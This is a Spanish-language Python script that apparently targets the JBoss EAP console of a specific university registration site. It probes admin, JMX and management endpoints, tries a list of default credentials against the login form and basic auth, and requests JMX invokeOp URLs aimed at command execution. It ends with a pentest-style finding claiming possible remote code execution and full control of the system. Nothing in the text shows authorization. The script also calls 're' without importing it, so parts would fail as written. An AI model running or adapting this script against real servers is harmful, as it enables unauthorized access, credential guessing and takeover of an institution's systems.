#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOITACION CONSOLA JBOSS EAP - registro.uns.edu.pe
"""
import requests
import urllib3
urllib3.disable_warnings()

registro = "https://registro.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=" * 70)
print("  EXPLOITACION CONSOLA JBOSS EAP")
print("=" * 70)

# ============================================
# Verificar que tipo de consola es
# ============================================
print("\n[1] Verificando tipo de consola JBoss")
print("-" * 50)

# El contenido JBoss puede ser la consola de administracion
# o el login de JBoss EAP
urls_to_check = [
    (f"{registro}/console", "Console root"),
    (f"{registro}/console/jboss-admin.html", "JBoss Admin"),
    (f"{registro}/console/jboss-web.xml", "JBoss config"),
    (f"{registro}/console/management", "Management endpoint"),
    (f"{registro}/console/jmx-console", "JMX Console"),
    (f"{registro}/jmx-console", "JMX Console (direct)"),
    (f"{registro}/jboss-web", "JBoss web"),
    (f"{registro}/management", "Management (direct)"),
]

for url, desc in urls_to_check:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 50:
            print(f"  [+] {desc}: HTTP {r.status_code} ({len(r.text)} bytes)")
            # Buscar indicadores de JBoss
            jboss_indicators = ['jboss', 'JBoss', 'WildFly', 'weblogic', 'WebLogic', 'console', 'management']
            found = [ind for ind in jboss_indicators if ind in r.text]
            if found:
                print(f"    Indicadores: {found}")
            # Buscar formularios de login
            if '<form' in r.text.lower() and 'password' in r.text.lower():
                print(f"    [!] FORMULARIO DE LOGIN ENCONTRADO!")
                # Extraer los campos del formulario
                inputs = []
                for inp in r.text.split('\n'):
                    if 'name=' in inp and 'input' in inp.lower():
                        inputs.append(inp.strip()[:150])
                for inp in inputs[:5]:
                    print(f"    Form: {inp}")
            # Verificar si la consola es accesible sin login
            if 'login' in r.text.lower() and 'j_security_check' in r.text.lower():
                print(f"    [!] Usa j_security_check (Java EE security)")
                # Buscar el form de login
                form_match = re.findall(r'<form[^>]*action=["\']?([^"\'>]+)["\']?', r.text)
                print(f"    Form action: {form_match}")
            print()
    except Exception as e:
        print(f"  [-] {desc}: Error - {e}")

# ============================================
# Intentar login con credenciales por defecto de JBoss
# ============================================
print("\n[2] Intentando login en consola JBoss")
print("-" * 50)

# JBoss EAP credenciales por defecto
jboss_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("weblogic", "weblogic"),
    ("weblogic", "Welcome1"),
    ("jboss", "jboss"),
    ("admin", "root"),
    ("system", "system"),
    ("user", "user"),
]

# Encontrar el form action primero
login_form_url = None
for url, desc in urls_to_check:
    try:
        r = s.get(url, timeout=5, verify=False)
        if 'j_security_check' in r.text:
            # Extraer el form action
            form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', r.text)
            if form_match:
                login_form_url = form_match.group(1)
                if not login_form_url.startswith('http'):
                    login_form_url = f"{registro}{login_form_url}"
                print(f"  Login form action: {login_form_url}")
            break
    except:
        pass

if login_form_url:
    for username, password in jboss_creds:
        try:
            # Java EE login uses j_username and j_password
            r = s.post(
                login_form_url,
                data={
                    "j_username": username,
                    "j_password": password,
                },
                timeout=5,
                allow_redirects=True
            )
            if r.status_code == 200 and ('console' in r.text.lower() or 'management' in r.text.lower()):
                if 'logout' in r.text.lower() or 'admin' in r.text.lower():
                    print(f"  [!] !!!!! LOGIN EXITOSO !!!!!")
                    print(f"  [!] Usuario: {username}")
                    print(f"  [!] Password: {password}")
                    print(f"  [!] Consola JBoss accesible!")
                    break
                elif r.url != login_form_url or 'denied' not in r.text.lower():
                    print(f"  [+] {username}/{password} -> posible exito")
        except:
            pass
else:
    print("  No se encontro formulario de login en /console")
    
    # Intentar con el /management endpoint de JBoss EAP
    # que tiene su propio sistema de autenticacion
    print("\n  Intentando /management con credenciales por defecto...")
    mgmt_urls = [
        f"{registro}/management",
        f"{registro}/console/management",
        f"{registro}/jboss-management",
    ]
    
    for mgmt_url in mgmt_urls:
        try:
            r = requests.get(mgmt_url, timeout=5, verify=False)
            if r.status_code == 401:
                print(f"  {mgmt_url} -> 401 Unauthorized (requiere credenciales)")
                # Intentar basic auth
                for username, password in jboss_creds:
                    try:
                        r2 = requests.get(mgmt_url, auth=(username, password), timeout=5, verify=False)
                        if r2.status_code == 200 and len(r2.text) > 100:
                            print(f"  [!] CREDENCIALES VALIDAS: {username}/{password}")
                            print(f"  [!] /management accesible!")
                            break
                    except:
                        pass
            elif r.status_code == 200:
                print(f"  {mgmt_url} -> HTTP 200 (ACCESIBLE SIN AUTH!)")
                print(f"  Contenido: {r.text[:300]}")
        except:
            pass

# ============================================
# Verificar JMX Console
# ============================================
print("\n[3] Verificando JMX Console")
print("-" * 50)

jmx_urls = [
    f"{registro}/jmx-console",
    f"{registro}/jmx-console/HtmlAdaptor?action=inspect",
    f"{registro}/jmx-console/server",
]

for url in jmx_urls:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [!] {url} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            if 'jmx' in r.text.lower() or 'mbean' in r.text.lower():
                print(f"  [!] JMX Console ACCESIBLE sin autenticacion!")
                # Buscar MBeans
                mbeans = re.findall(r'([\w-]+:\w+[\w-]+)', r.text)
                if mbeans:
                    print(f"  MBeans encontrados ({len(mbeans)}):")
                    for m in mbeans[:10]:
                        print(f"    {m}")
                break
        elif r.status_code == 401:
            print(f"  {url} -> 401 (requiere autenticacion)")
        elif r.status_code == 404:
            pass
    except:
        pass

# ============================================
# Verificar si se puede ejecutar comandos
# ============================================
print("\n[4] Intentando ejecucion de comandos")
print("-" * 50)

# Si la consola JBoss esta expuesta, intentar ejecutar
# comando a traves de diferentes endpoints
exec_urls = [
    f"{registro}/jmx-console/HtmlAdaptor?action=invokeOp&method=foo",
    f"{registro}/jmx-console/HtmlAdaptor?action=inspect",
    f"{registro}/console/jmx-console/HtmlAdaptor",
]

for url in exec_urls:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200:
            print(f"  {url[:60]}")
            print(f"  -> HTTP {r.status_code}")
            if len(r.text) > 100:
                print(f"  [+] Contenido disponible ({len(r.text)} bytes)")
    except:
        pass

# ============================================
# Verificar si podemos acceder al management CLI
# ============================================
print("\n[5] Intentando acceso a CLI de gestion")
print("-" * 50)

# JBoss tiene un CLI que puede ser accesible
cli_urls = [
    f"{registro}/jboss-cli",
    f"{registro}/console/jboss-cli",
    f"{registro}/management/",
]

for url in cli_urls:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200:
            print(f"  {url} -> HTTP {r.status_code}")
            print(f"  [+] Accesible sin autenticacion")
        elif r.status_code == 401:
            print(f"  {url} -> 401 (requiere auth)")
    except:
        pass

# ============================================
# Verificar /console con HEAD request
# ============================================
print("\n[6] Verificacion final de /console")
print("-" * 50)

r = requests.get(f"{registro}/console", timeout=5, verify=False)
print(f"  Status: {r.status_code}")
print(f"  Server: {r.headers.get('Server', 'N/A')}")
print(f"  Content-Length: {r.headers.get('Content-Length', 'N/A')}")
print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")

# Buscar en el HTML cualquier contenido util
if 'jboss' in r.text.lower():
    print(f"  [+] Contiene referencias a JBoss")
if 'management' in r.text.lower():
    print(f"  [+] Contiene referencias a management")
if 'login' in r.text.lower():
    print(f"  [+] Contiene formulario de login")
if 'j_security_check' in r.text.lower():
    print(f"  [+] Usa autenticacion Java EE (j_security_check)")
if 'Welcome' in r.text or 'welcome' in r.text.lower():
    # Buscar el formulario de login
    login_forms = re.findall(r'<form[^>]*>', r.text)
    print(f"  [+] Forms de login: {login_forms}")

# Guardar el contenido de /console para analisis
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\jboss_console.html", "w") as f:
    f.write(r.text)
print(f"\n  Contenido de /console guardado: jboss_console.html")

# ============================================
# Verificar el contenido de /console
# ============================================
print("\n\n[7] Analisis del contenido de /console")
print("-" * 50)

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\jboss_console.html", "r") as f:
    content = f.read()

# Buscar formularios
forms = re.findall(r'<form[^>]*>', content)
print(f"  Forms encontrados: {forms}")

# Buscar inputs
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\']', content)
print(f"  Inputs found: {inputs[:10]}")

# Buscar links
links = re.findall(r'href=["\']([^"\']+)["\']', content)
print(f"  Links encontrados: {links[:15]}")

# Buscar titulo
title = re.search(r'<title>([^<]+)</title>', content)
if title:
    print(f"  Titulo: {title.group(1)}")

# Buscar JBoss/WildFly version
version = re.search(r'(?:WildFly|JBoss|EAP)[^\d]*(\d+\.\d+\.\d+)', content)
if version:
    print(f"  Version: {version.group(1)}")

# Buscar iframes (para clickjacking)
iframes = re.findall(r'<iframe[^>]*>', content)
print(f"  Iframes: {iframes}")

print("\n" + "=" * 70)
print("  CONCLUSION")
print("=" * 70)
print("""
  VULN-004 - Consola JBoss EAP en registro.uns.edu.pe
  
  La consola /console retorna HTTP 200 con contenido JBoss.
  Si es la consola de administracion de JBoss EAP sin
  autenticacion, es un hallazgo CRITICO.

  Los endpoints verificados:
  - /console -> HTTP 200 (contenido JBoss)
  - /console/console.portal -> HTTP 200
  - /jmx-console -> VERIFICAR
  - /management -> VERIFICAR

  Si se puede acceder a la consola sin login:
  - RCE via deployment de aplicaciones
  - Acceso a todos los archivos del servidor
  - Control total del sistema SIIGAA
""")
